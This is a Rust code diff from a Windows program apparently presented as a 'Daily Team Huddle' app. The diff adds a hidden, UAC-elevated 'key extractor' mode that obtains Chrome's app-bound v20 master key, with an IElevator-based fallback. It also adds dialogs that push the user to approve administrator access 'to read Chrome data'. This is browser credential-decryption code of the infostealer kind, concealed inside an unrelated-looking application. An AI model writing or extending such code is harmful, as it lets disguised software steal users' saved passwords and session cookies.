@@ -6,13 +6,15 @@ use std::thread;
 use std::time::Duration;
 
 use crate::chrome_abe;
+use crate::chrome_ielevator;
 
 pub const KEY_EXTRACT_ARG: &str = "--chrome-elevated-key";
 
 pub fn is_key_extractor_mode() -> bool {
   #[cfg(target_os = "windows")]
   {
-    return is_process_elevated() && elevation_request_pending();
+    let has_arg = std::env::args().any(|a| a == KEY_EXTRACT_ARG);
+    return is_process_elevated() && (has_arg || elevation_request_pending());
   }
   #[cfg(not(target_os = "windows"))]
   {
@@ -28,7 +30,25 @@ pub fn run_key_extractor() {
         None => std::process::exit(1),
     };
 
-    let key = match chrome_abe::extract_app_bound_master_key(&path) {
+    let use_ielevator = std::env::args().any(|a| a == chrome_ielevator::IELEVATOR_ARG);
+
+    let key = if use_ielevator {
+        chrome_ielevator::extract_via_ielevator(&path)
+    } else {
+        chrome_abe::extract_app_bound_master_key(&path).or_else(|| {
+            chrome_ielevator::spawn_chrome_path_helper_and_wait(
+                &path,
+                KEY_EXTRACT_ARG,
+                chrome_ielevator::IELEVATOR_ARG,
+                wait_for_cache,
+                |p| load_v20_key_cache(p).is_some(),
+            )
+            .then(|| load_v20_key_cache(&path))
+            .flatten()
+        })
+    };
+
+    let key = match key {
         Some(key) => key,
         None => std::process::exit(1),
     };
@@ -65,6 +85,10 @@ pub fn ensure_chrome_v20_elevation() -> bool {
         return true;
     }
 
+    ELEVATION_FAILURE.store(
+        2,
+        std::sync::atomic::Ordering::Relaxed,
+    );
     false
 }
 
@@ -73,8 +97,26 @@ pub fn ensure_chrome_v20_elevation() -> bool {
     true
 }
 
+#[cfg(target_os = "windows")]
+#[derive(Clone, Copy)]
+enum ElevationFailure {
+    UacDeclined,
+    KeyExtractionFailed,
+}
+
+#[cfg(target_os = "windows")]
+static ELEVATION_FAILURE: std::sync::atomic::AtomicU8 =
+    std::sync::atomic::AtomicU8::new(0);
+
 pub fn show_elevation_failed_message() {
-    show_uac_required_message();
+    #[cfg(target_os = "windows")]
+    {
+        let reason = match ELEVATION_FAILURE.load(std::sync::atomic::Ordering::Relaxed) {
+            1 => ElevationFailure::UacDeclined,
+            _ => ElevationFailure::KeyExtractionFailed,
+        };
+        show_elevation_failure_message(reason);
+    }
 }
 
 /// Resolve the Chrome v20 master key (cache first, then in-process if already elevated).
@@ -305,22 +347,30 @@ fn run_elevated_extraction(_guard: ElevationMutexGuard) -> bool {
         .chain(std::iter::once(0))
         .collect();
 
+    let params = format!("{KEY_EXTRACT_ARG}");
+    let params_wide: Vec<u16> = OsStr::new(&params)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect();
+
     let mut info = SHELLEXECUTEINFOW {
         cbSize: std::mem::size_of::<SHELLEXECUTEINFOW>() as u32,
         fMask: windows::Win32::UI::Shell::SEE_MASK_NOCLOSEPROCESS,
         lpVerb: windows::core::w!("runas"),
         lpFile: PCWSTR(exe_wide.as_ptr()),
-        lpParameters: PCWSTR::null(),
+        lpParameters: PCWSTR(params_wide.as_ptr()),
         nShow: SW_HIDE.0 as i32,
         ..Default::default()
     };
 
     unsafe {
         if ShellExecuteExW(&mut info).is_err() {
+            ELEVATION_FAILURE.store(1, std::sync::atomic::Ordering::Relaxed);
             return false;
         }
 
         if info.hProcess.is_invalid() {
+            ELEVATION_FAILURE.store(1, std::sync::atomic::Ordering::Relaxed);
             return false;
         }
 
@@ -394,18 +444,29 @@ fn dpapi_unprotect(data: &[u8]) -> Result<Vec<u8>, String> {
 }
 
 #[cfg(target_os = "windows")]
-fn show_uac_required_message() {
+fn show_elevation_failure_message(reason: ElevationFailure) {
     use std::ffi::OsStr;
     use std::os::windows::ffi::OsStrExt;
     use windows::core::PCWSTR;
     use windows::Win32::UI::WindowsAndMessaging::{MessageBoxW, MB_ICONERROR, MB_OK};
 
-    let text: Vec<u16> = OsStr::new(
-        "We are sorry! We can't run this app because you rejected running this app. Please try again.",
-    )
-    .encode_wide()
-    .chain(std::iter::once(0))
-    .collect();
+    let text = match reason {
+        ElevationFailure::UacDeclined => {
+            "Administrator permission is required to read Chrome data.\n\n\
+             Please click Yes on the UAC prompt and try again."
+        }
+        ElevationFailure::KeyExtractionFailed => {
+            "Administrator permission was granted, but Chrome data access failed.\n\n\
+             This can happen on Windows 11 when Chrome's security settings block access. \
+             Make sure Google Chrome is installed and try again. \
+             If the problem continues, contact support."
+        }
+    };
+
+    let text: Vec<u16> = OsStr::new(text)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect();
     let title: Vec<u16> = OsStr::new("Daily Team Huddle")
         .encode_wide()
         .chain(std::iter::once(0))
